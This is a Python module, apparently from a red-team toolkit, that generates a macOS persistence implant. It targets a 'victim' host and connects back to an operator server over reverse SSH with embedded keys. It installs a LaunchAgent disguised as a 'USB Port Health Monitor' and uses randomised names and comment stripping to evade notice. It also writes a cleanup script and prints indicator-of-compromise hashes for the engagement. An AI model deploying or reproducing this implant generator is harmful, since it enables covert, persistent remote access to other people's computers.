#!/usr/bin/env python3
# Copyright (c) 2024, Oracle and/or its affiliates.

import os
from genericpath import exists
from opcode import haslocal
import base64
import uuid
import datetime
import hashlib
from pathlib import Path
import shutil
import jinja2
from . import core, settings


backflipsBaseDir = settings.BACKFLIPS_BASE_DIR
keysDir = Path(f"{backflipsBaseDir}/keys/")
payloadsDir = Path(f"{backflipsBaseDir}/payloads/")
cleanupScriptsDir = Path(f"{backflipsBaseDir}/cleanup/")

def makebackflip(backflipServer, victim, args):
    logging = args.verbose
    payloadkeyname = "".join(core.getrandomwords(2))
    flockfilename = "".join(core.getrandomwords(1))
    lagentname = f"com.{'.'.join(core.getrandomwords(2))}.worker"
    imaginarypayloadname = "".join(core.getrandomwords(1))
    faceplant =  victim.username.split("_")[0]
    victimHostkey = None
    victimHostkey_name = "".join(core.getrandomwords(1))
    tmpMacVictim = Path(f"{payloadsDir}/tmp/macVictimHoskey/")
    tmpVictimHostkeyDir = Path(f"{tmpMacVictim}/etc/ssh/")
    victimSSHDport = 6047

    print(f"[*] Date of backflipdeploy invocation: {str(datetime.datetime.now())} UTC")
    print ("[*] victim host: %s" % victim.hostname)
    print ("[*] backflipServer.name: %s" % backflipServer.name)
    print ("[*] victim port: %s" % victim.port)

    # Generate new hostkeys for starting sshd as user on the victim mac
    tmpVictimHostkeyDir.mkdir(parents=True, exist_ok=True)
    os.system(f"ssh-keygen -A -f {tmpMacVictim}")
    with open(f"{tmpVictimHostkeyDir}/ssh_host_ed25519_key", "r") as file:
        victimHostkey = file.read()

    shutil.rmtree(tmpMacVictim, ignore_errors=True)

    pubkey = base64.b64encode(victim.pubKey.encode('utf-8')).decode('utf-8')
    privkey = base64.b64encode(victim.privKey.encode('utf-8')).decode('utf-8')
    victimHostkey = base64.b64encode(victimHostkey.encode('utf-8')).decode('utf-8')

    lagentPlistXML = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>USB Port Health Monitor</string>
  <key>Program</key>
  <string>/Users/{victim.username}/Library/LaunchAgents/{imaginarypayloadname}</string>
  <key>StartInterval</key>
  <integer>300</integer>
  <key>RunAtLoad</key>
  <true/>
</dict>
</plist>'''

    lagentPlistXML_b64 = base64.b64encode(lagentPlistXML.encode('utf-8')).decode('utf-8')

    motherflock = f"""#!/usr/bin/env perl
# {" ".join(core.getrandomwords(3))}
use Fcntl ':flock';open my $self, '<', $0 or die;flock $self, LOCK_EX | LOCK_NB or die;system(@ARGV);
# {" ".join(core.getrandomwords(2))}"""

    motherflock_b64 = base64.b64encode(motherflock.encode('utf-8')).decode('utf-8')

    jinjenv = jinja2.Environment(loader=jinja2.FileSystemLoader("sshbackflip/macos/"))

    implant_template = jinjenv.get_template("payload_template.sh")
    implant = implant_template.render({
        "TARGET_USER" : victim.username,
        "FACEPLANT" :  faceplant,
        "PORT_PLACEHOLDER" : victim.port,
        "REMOTE_PLACEHOLDER": backflipServer.port,
        "FQDN_PLACEHOLDER" : backflipServer.name,
        "PRIVATE_KEY_PLACEHOLDER" : privkey,
        "PUBLIC_KEY_PLACEHOLDER" : pubkey,
        "BACKFLIP_PUB_PLACEHOLDER" : backflipServer.hostKey,
        "PRIVATE_KEY_PATH_PLACEHOLDER" : payloadkeyname,
        "HOST_KEY_PLACEHOLDER" : victimHostkey,
        "HOST_KEY_NAME" : victimHostkey_name,
        "SSHD_PORT" : victimSSHDport,
        "FLOCK_NAME_PLACEHOLDER" : flockfilename,
        "FLOCK_CODE_PLACEHOLDER" : motherflock_b64,
        "LAGENT_XML_PLACEHOLDER" : lagentPlistXML_b64,
        "LAGENT_NAME_PLACEHOLDER" : lagentname,
        "IMAGINARY_PAYLOAD_NAME" : imaginarypayloadname,
        })
    implant = core.nocomments(implant)

    cleaner_template = jinjenv.get_template("cleanup.py")
    cleaner = cleaner_template.render({
        "PUBLIC_KEY_PLACEHOLDER" : pubkey,
        "BACKFLIP_PUB_PLACEHOLDER" : backflipServer.hostKey,
        "PRIVATE_KEY_PATH_PLACEHOLDER" : payloadkeyname,
        "HOST_KEY_PLACEHOLDER" : victimHostkey,
        "HOST_KEY_NAME" : victimHostkey_name,
        "FLOCK_NAME_PLACEHOLDER" : flockfilename,
        "LAGENT_NAME_PLACEHOLDER" : lagentname,
    })
    cleaner = core.nocomments(cleaner)

    implantName = f"macos-{victim.username}-{victim.hostname}-{backflipServer.name}-{imaginarypayloadname}"
    with open(f"{cleanupScriptsDir}/{implantName}_cleanup.py", 'w') as file2:
        file2.write(cleaner)
    with open(f"{payloadsDir}/{implantName}", 'w') as file:
        file.write(implant)

    implantHash = hashlib.md5(implant.encode('utf-8')).hexdigest()
    flockHash = hashlib.md5(motherflock.encode('utf-8')).hexdigest()
    implantPrivKeyHash = hashlib.md5(payloadkeyname.encode('utf-8')).hexdigest()
    lagentHash = hashlib.md5(lagentPlistXML.encode('utf-8')).hexdigest()
    implantHash2 = hashlib.sha256(implant.encode('utf-8')).hexdigest()
    flockHash2 = hashlib.sha256(motherflock.encode('utf-8')).hexdigest()
    implantPrivKeyHash2 = hashlib.sha256(payloadkeyname.encode('utf-8')).hexdigest()
    lagentHash2 = hashlib.sha256(lagentPlistXML.encode('utf-8')).hexdigest()

    print(f"\n[+] Path of backflip public key on infra: {victim.privKeyPath}")
    print(f"\n[+] Path of cleanup script on infra: {cleanupScriptsDir}/{implantName}_cleanup.py")
    print(f"[I] This specific backflip payload calls itself '{imaginarypayloadname}' but you can call it whatever name you like")
    #print(f"\n[+] Paste the following into the victim:\n\n{implant}\n\n") #this implant is not a oneliner yet.
    print(f"\n[I] IOCs:")
    print(f"[I] Backflip private key {payloadkeyname} \n\t|SHA256:{implantPrivKeyHash2} \n\t|MD5:{implantPrivKeyHash}")
    print(f"[I] FLock file {flockfilename}.pl \n\t|SHA256:{flockHash2} \n\t|MD5:{flockHash}")
    print(f"[I] LaunchAgent {lagentname} (asuming you provided the right username but you may want to recheck hashes on host) \n\t|SHA256:{lagentHash2} \n\t|MD5:{lagentHash}")
    print(f"[I] Payload installer located at: {payloadsDir}/{implantName} \n\t|SHA256:{implantHash2} \n\t|MD5:{implantHash}")
    print(f"\n[+] Have a nice day!")
